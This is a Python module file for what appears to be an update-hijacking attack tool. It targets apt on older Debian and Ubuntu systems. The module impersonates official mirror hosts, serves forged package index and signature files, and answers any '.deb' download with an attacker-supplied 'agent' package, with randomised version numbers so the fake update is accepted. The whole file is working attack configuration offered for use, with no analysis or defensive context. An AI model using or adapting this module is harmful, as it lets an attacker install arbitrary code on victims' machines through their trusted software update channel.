from modules import ModuleBase


class Apt(ModuleBase):
    name = 'apt'
    version = '1.1'
    appver = '< 0.7.14ubuntu6 | ubuntu 10.04 LTS'
    author = ['Leandro Costantino < lcostantino +[AT]+ gmail.com>']
    description = ''
    agent_filename = './agent/debian/seed-debian_0.3_all.deb'
    vh = '(ftp.br.debian.org|ar.archive.ubuntu.com|security.ubuntu.com|archive.ubuntu.com|security.debian.org)' 
    requests = [
        {   'path': 'Packages*.bz2',
            'type': 'file',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 1,
            'file': './include/debian/Packages.bz2'
        },
        {   'path': '(Release.gpg)',
            'type': 'file',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 1,
            'file': './include/debian/Release.gpg'
        },

        {   'path': '(Translation)',
            'type': 'file',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 1,
            'file': './include/debian/Translation.bz2'
        },

        {   'path': 'Sources.bz2',
            'type': 'file',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 1,
            'file': './include/debian/Sources.bz2'
        },

        {
            #           'path': 'seed\-debian', #brequest
            'path': '\.deb',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'version': {
            'val': "'7.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        },
        'module': {
            'val': "module.options['brequest']['val'].split('/')[-1] ",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }